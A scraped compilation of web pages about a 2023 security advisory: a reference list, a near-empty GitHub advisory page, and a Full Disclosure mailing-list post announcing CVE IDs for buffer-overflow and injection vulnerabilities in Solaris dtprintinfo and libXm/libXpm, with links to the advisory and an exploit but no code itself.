[1] https://github.com/0xdea/raptor\_infiltrate20[2] https://www.exploit-db.com/search?q=dtprintinfo[3] https://www.xfree86.org/current/xpm.pdf[4] http://www.opengroup.org/desktop/motif.html[5] https://github.com/0xdea/ghidra-scripts/blob/main/Rhabdomancer.java[6] https://github.com/0xdea/raptor\_infiltrate19[7] https://github.com/0xdea/exploits/blob/master/solaris/raptor\_dtprintlibXmas.c[8] https://sourceforge.net/projects/cdesktopenv/[9] https://sourceforge.net/projects/motif/
Copyright (c) 2023 Marco Ivaldi and Humanativa Group. All rights reserved.

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from github.com_6498189f_20250115_113938.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2F0xdea%2Fadvisories%2Fblob%2Fmaster%2FHNS-2022-01-dtprintinfo.txt)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2F0xdea%2Fadvisories%2Fblob%2Fmaster%2FHNS-2022-01-dtprintinfo.txt)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fblob%2Fshow&source=header-repo&source_repo=0xdea%2Fadvisories)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[0xdea](/0xdea)
/
**[advisories](/0xdea/advisories)**
Public

* [Notifications](/login?return_to=%2F0xdea%2Fadvisories) You must be signed in to change notification settings
* [Fork
  5](/login?return_to=%2F0xdea%2Fadvisories)
* [Star
   22](/login?return_to=%2F0xdea%2Fadvisories)

* [Code](/0xdea/advisories)
* [Issues
  0](/0xdea/advisories/issues)
* [Pull requests
  0](/0xdea/advisories/pulls)
* [Actions](/0xdea/advisories/actions)
* [Projects
  0](/0xdea/advisories/projects)
* [Security](/0xdea/advisories/security)
* [Insights](/0xdea/advisories/pulse)

Additional navigation options

* [Code](/0xdea/advisories)
* [Issues](/0xdea/advisories/issues)
* [Pull requests](/0xdea/advisories/pulls)
* [Actions](/0xdea/advisories/actions)
* [Projects](/0xdea/advisories/projects)
* [Security](/0xdea/advisories/security)
* [Insights](/0xdea/advisories/pulse)

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from seclists.org_af2059f7_20250114_191026.html ===

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)
[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![fulldisclosure logo](/images/fulldisclosure-logo.png)](/fulldisclosure/)
## [Full Disclosure](/fulldisclosure/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](23)
[By Date](date.html#24)
[![Next](/images/right-icon-16x16.png)](18)

[![Previous](/images/left-icon-16x16.png)](12)
[By Thread](index.html#24)
[![Next](/images/right-icon-16x16.png)](10)

![](/shared/images/nst-icons.svg#search)

# Re: HNS-2022-01 - HN Security Advisory - Multiple vulnerabilities in Solaris dtprintinfo and libXm/libXpm

---

*From*: Marco Ivaldi <raptor () 0xdeadbeef info>

*Date*: Sat, 21 Jan 2023 07:58:25 +0100

---

```
Hello again,

Just a quick update. Mitre has assigned the following additional CVE IDs:

* CVE-2023-24039 - Stack-based buffer overflow in libXm ParseColors
* CVE-2023-24040 - Printer name injection and heap memory disclosure

We have updated the advisory accordingly:
<https://github.com/hnsecurity/vulns/blob/main/HNS-2022-01-dtprintinfo.txt>

Regards,
Marco

On Wed, Jan 18, 2023 at 9:48 AM Marco Ivaldi <raptor () 0xdeadbeef info> wrote:

```
> ```
>
>
> Dear Full Disclosure,
>
> Find attached a security advisory that details multiple
> vulnerabilities we discovered in Oracle Solaris CDE dtprintinfo, Motif
> libXm, and X.Org libXpm.
>
> * Title: Multiple vulnerabilities in Solaris dtprintinfo and libXm/libXpm
> * Products: Common Desktop Environment 1.6, Motif 2.1, X.Org libXpm < 3.5.15
> * OS: Oracle Solaris 10 (CPU January 2021)
> * Author: Marco Ivaldi <marco.ivaldi () hnsecurity it>
> * Date: 2023-01-18
> * Oracle vulnerability tracking numbers:
>   * S1597707 - Arbitrary printer name injection
>   * S1597724 - Heap memory disclosure via long printer names
>   * S1597711 - Memory corruption via malformed icon files
>   * S1597730 - Stack-based buffer overflow in libXm ParseColors
> * CVE IDs:
>   * CVE-2022-46285 - Infinite loop on unclosed comments in Xorg libXpm
> * Advisory URLs:
>   * <https://github.com/hnsecurity/vulns/blob/main/HNS-2022-01-dtprintinfo.txt>
>   * <https://lists.x.org/archives/xorg-announce/2023-January/003312.html>
>   * <https://lists.x.org/archives/xorg-announce/2023-January/003313.html>
> * Exploit URLs:
>   * <https://github.com/0xdea/exploits/blob/master/solaris/raptor_dtprintlibXmas.c>
>
> For additional information, please refer to our vulnerability writeup:
> <https://security.humanativaspa.it/nothing-new-under-the-sun/>
>
> PS. No, HNS-2022-01 is not a typo. Check out the disclosure timeline
> in the advisory and you'll understand why we used this label.
>
> ```

```

--
Marco Ivaldi
<https://0xdeadbeef.info/>
"When cryptography is outlawed, bayl bhgynjf jvyy unir cevinpl."
_______________________________________________
Sent through the Full Disclosure mailing list
<https://nmap.org/mailman/listinfo/fulldisclosure>
Web Archives & RSS: <https://seclists.org/fulldisclosure/>

```

---

[![Previous](/images/left-icon-16x16.png)](23)
[By Date](date.html#24)
[![Next](/images/right-icon-16x16.png)](18)

[![Previous](/images/left-icon-16x16.png)](12)
[By Thread](index.html#24)
[![Next](/images/right-icon-16x16.png)](10)

### Current thread:

* [HNS-2022-01 - HN Security Advisory - Multiple vulnerabilities in Solaris dtprintinfo and libXm/libXpm](12) *Marco Ivaldi (Jan 19)*
  + **Re: HNS-2022-01 - HN Security Advisory - Multiple vulnerabilities in Solaris dtprintinfo and libXm/libXpm** *Marco Ivaldi (Jan 23)*

![](/shared/images/nst-icons.svg#search)

## [Nmap Security Scanner](https://nmap.org/)

* [Ref Guide](https://nmap.org/book/man.html)* [Install Guide](https://nmap.org/book/install.html)* [Docs](https://nmap.org/docs.html)* [Download](https://nmap.org/download.html)* [Nmap OEM](https://nmap.org/oem/)

## [Npcap packet capture](https://npcap.com/)

* [User's Guide](https://npcap.com/guide/)* [API docs](https://npcap.com/guide/npcap-devguide.html#npcap-api)* [Download](https://npcap.com/#download)* [Npcap OEM](https://npcap.com/oem/)

## [Security Lists](https://seclists.org/)

* [Nmap Announce](https://seclists.org/nmap-announce/)* [Nmap Dev](https://seclists.org/nmap-dev/)* [Full Disclosure](https://seclists.org/fulldisclosure/)* [Open Source Security](https://seclists.org/oss-sec/)* [BreachExchange](https://seclists.org/dataloss/)

## [Security Tools](https://sectools.org)

* [Vuln scanners](https://sectools.org/tag/vuln-scanners/)* [Password audit](https://sectools.org/tag/pass-audit/)* [Web scanners](https://sectools.org/tag/web-scanners/)* [Wireless](https://sectools.org/tag/wireless/)* [Exploitation](https://sectools.org/tag/sploits/)

## [About](https://insecure.org/)

* [About/Contact](https://insecure.org/fyodor/)* [Privacy](https://insecure.org/privacy.html)* [Advertising](https://insecure.org/advertising.html)* [Nmap Public Source License](https://nmap.org/npsl/)

[![](/shared/images/nst-icons.svg#twitter)](https://twitter.com/nmap "Visit us on Twitter")
[![](/shared/images/nst-icons.svg#facebook)](https://facebook.com/nmap "Visit us on Facebook")
[![](/shared/images/nst-icons.svg#github)](https://github.com/nmap/ "Visit us on Github")
[![](/shared/images/nst-icons.svg#reddit)](https://reddit.com/r/nmap/ "Discuss Nmap on Reddit")


